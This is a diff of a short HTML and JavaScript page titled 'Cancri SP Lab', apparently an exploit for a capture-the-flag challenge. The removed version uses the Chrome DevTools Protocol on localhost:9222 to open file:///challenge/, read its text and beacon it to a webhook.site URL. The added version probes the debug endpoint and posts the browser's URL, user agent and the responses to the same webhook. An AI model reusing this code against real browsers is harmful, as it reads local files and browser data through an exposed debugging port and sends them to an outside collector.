@@ -1,73 +1,66 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Cancri SP Lab</title>
-</head>
-<body>
-  <h1>Cancri SP Lab</h1>
-  <pre id="status">Waiting...</pre>
+<script>
+const webhook =
+  "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-  <script>
-    const webhook =
-      "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
+async function report(stage, details = {}) {
+  const data = JSON.stringify({
+    stage,
+    details,
+    time: new Date().toISOString()
+  });
 
-    function log(...args) {
-      const data = JSON.stringify(args, null, 2);
-      document.getElementById("status").textContent +=
-        "\n" + data;
+  document.getElementById("status").textContent +=
+    "\n" + data;
 
-      navigator.sendBeacon(
-        webhook,
-        new Blob([data], { type: "text/plain" })
-      );
-    }
+  try {
+    await fetch(webhook, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "text/plain"
+      },
+      body: data
+    });
+  } catch (e) {
+    console.error(e);
+  }
+}
 
-    const sleep = ms =>
-      new Promise(resolve => setTimeout(resolve, ms));
+async function run() {
+  await report("page_loaded", {
+    url: location.href,
+    userAgent: navigator.userAgent
+  });
 
-    async function run() {
-      try {
-        log("Starting CDP");
+  try {
+    await report("before_cdp_fetch");
 
-        const response = await fetch(
-          "http://localhost:9222/json/new?file:///challenge/",
-          { method: "PUT" }
-        );
+    const controller = new AbortController();
+    const timeout = setTimeout(
+      () => controller.abort(), 4000
+    );
 
-        const target = await response.json();
-        log("CDP target", target);
-
-        const ws = new WebSocket(
-          target.webSocketDebuggerUrl
-        );
-
-        ws.onerror = () => log("WebSocket error");
-
-        ws.onopen = async () => {
-          log("WebSocket connected");
-
-          await sleep(500);
-
-          ws.send(JSON.stringify({
-            id: 1,
-            method: "Runtime.evaluate",
-            params: {
-              expression: "document.body.innerText"
-            }
-          }));
-        };
-
-        ws.onmessage = event => {
-          log("CDP result", event.data);
-        };
-
-      } catch (error) {
-        log("ERROR", error.message, error.stack);
+    const response = await fetch(
+      "http://localhost:9222/json/version",
+      {
+        signal: controller.signal
       }
-    }
+    );
 
-    run();
-  </script>
-</body>
-</html>
+    clearTimeout(timeout);
+
+    await report("cdp_response", {
+      status: response.status,
+      body: await response.text()
+    });
+
+  } catch (e) {
+    await report("cdp_error", {
+      name: e.name,
+      message: e.message
+    });
+  }
+}
+
+run();
+</script>
